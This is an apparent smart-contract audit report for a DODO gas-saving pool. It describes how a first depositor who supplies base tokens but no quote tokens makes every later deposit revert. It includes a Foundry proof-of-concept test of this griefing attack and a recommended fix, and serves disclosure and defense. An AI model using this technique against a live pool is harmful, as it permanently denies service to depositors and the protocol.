Witty Cerulean Panther

high

# First depositor can brick the pool

## Summary
The initial depositor isn't required to deposit quote tokens. However, if the depositor chooses not to deposit any quote tokens, subsequent deposits will revert. This occurs because the shares are accounted as 0 when quote tokens aren't deposited, and the minimum value for shares is 1000.
## Vulnerability Detail
When the first depositor deposits, there are no restrictions to force depositor to deposit a decent amount of quote tokens. When the depositor does not deposits any quote tokens then the pool will have 0 quote token reserves. When the pool has 0 quote tokens all the other deposits will fail because of [this](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L65) if check will never be executed and shares will be default to 0 hence, the [mint](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol#L295) will fail because the shares to mint (0) is lesser than the minimum mint value. 


PoC:
```solidity
function test_FirstDepositorCanBrickThePool() external {
        // tapir deposits tiny amounts to grief, important is that tapir deposits 0 quote tokens!
        vm.startPrank(tapir);
        dai.safeTransfer(address(gsp), 1001);
        usdc.transfer(address(gsp), 0);
        gsp.buyShares(tapir);

        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());
        console.log("Tapirs shares", gsp.balanceOf(tapir));

        vm.stopPrank();
        vm.startPrank(hippo);

        // hippo wants to deposits properly, but it will fail because of the minimum mint value!
        dai.safeTransfer(address(gsp), 1000 * 1e18);
        usdc.transfer(address(gsp), 1000 * 1e6);
        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        gsp.buyShares(hippo);
    }
```
## Impact
Since this exploit does not requires big funds (simply 1004 in 18 decimals is enough which is lesser than a penny) and it will forever block the pool, I'll label this as high. 
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L31-L82
## Tool used

Manual Review

## Recommendation
Force the first depositor to deposit decent amount of quote tokens